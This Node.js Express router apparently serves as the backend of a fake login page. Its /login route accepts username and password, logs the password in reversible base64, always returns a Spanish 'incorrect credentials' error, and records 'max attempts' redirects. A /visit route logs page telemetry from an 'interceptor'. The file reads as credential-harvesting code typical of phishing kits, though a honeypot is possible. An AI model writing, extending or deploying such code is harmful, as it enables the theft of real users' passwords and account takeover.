'use strict';

const express = require('express');

const logger            = require('../utils/logger');
const { buildLogEntry, toBase64 } = require('../utils/helpers');
const { loginLimiter }  = require('../middleware/rateLimiter');

const router = express.Router();

// ──────────────────────────────────────────────────────────
// POST /login
// Handles both normal login attempts and max-attempts redirects.
// ──────────────────────────────────────────────────────────
router.post('/login', loginLimiter, (req, res) => {
  const { username, password, page, event, attempts, redirectTo } = req.body;

  const isRedirect = event === 'MAX_ATTEMPTS_REDIRECT';
  const eventName  = isRedirect ? 'max_attempts_redirect' : 'login_attempt';

  logger.info(eventName, buildLogEntry(req, {
    event:          isRedirect ? 'MAX_ATTEMPTS_REDIRECT' : 'LOGIN_ATTEMPT',
    page:           page || null,
    username:       username || '(vacío)',
    password:       password ? toBase64(password) : '(vacío)',
    passwordLength: password?.length ?? 0,
    ...(isRedirect && {
      attempts:   attempts   || null,
      redirectTo: redirectTo || null,
    }),
  }));

  res.status(401).json({
    success: false,
    error:   'Credenciales incorrectas. Por favor, inténtalo de nuevo.',
  });
});

// ──────────────────────────────────────────────────────────
// POST /visit
// Records page-visit telemetry from the interceptor.
// ──────────────────────────────────────────────────────────
router.post('/visit', (req, res) => {
  const { page = '/', user = 'anonymous' } = req.body || {};

  logger.info('page_visit', buildLogEntry(req, {
    event: 'PAGE_VISIT',
    page,
    user,
  }));

  res.json({ success: true });
});

module.exports = router;
